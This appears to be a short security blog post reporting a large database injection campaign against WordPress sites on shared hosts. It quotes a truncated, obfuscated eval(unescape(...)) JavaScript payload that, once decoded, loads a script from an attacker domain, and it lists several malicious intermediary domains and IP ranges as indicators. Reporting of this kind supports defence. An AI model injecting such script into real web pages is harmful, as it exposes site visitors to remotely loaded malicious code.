Database injection, lessthenaminutehandle.com and more updates

We posted a few weeks ago about a large scale database injection attack affecting WordPress on shared hosts. The infected sites got the following javascript malware inserted on every post of their database (generally the wp-post table on WordPress):

<script>eval(unescape("%64%6F%63%75%6D%65%6E%74%2E%77%72..
70%3F%6B%6B%3D%33%33%22%3E%3C%2F%73%63%72%69%70%74%3E%27%29%3B"..

Which after decoded, attempted to include and load the following link: lessthenaminutehandle.com/js.php?kk=33
We also saw multiple variations of it, where the following domains where used as the main intermediaries:

http://lessthenaseconddeal.com/ll.php?k=09
globalpoweringgathering.com
lessthenaminutehandle.com
lessthenaseconddeal.com
welcometotheglobalisnet.com

What is interesting is the number of sub-intermediaries that change every few hours:

They are using domains on multiple TLDs (.net, .com, .in, .us, etc) and changing every hour. The most common network for these to be hosted are at: 65.23.153.0/24 and 46.252.130.0/24, but that changes often as well. We will keep you posted as we track themâ€¦
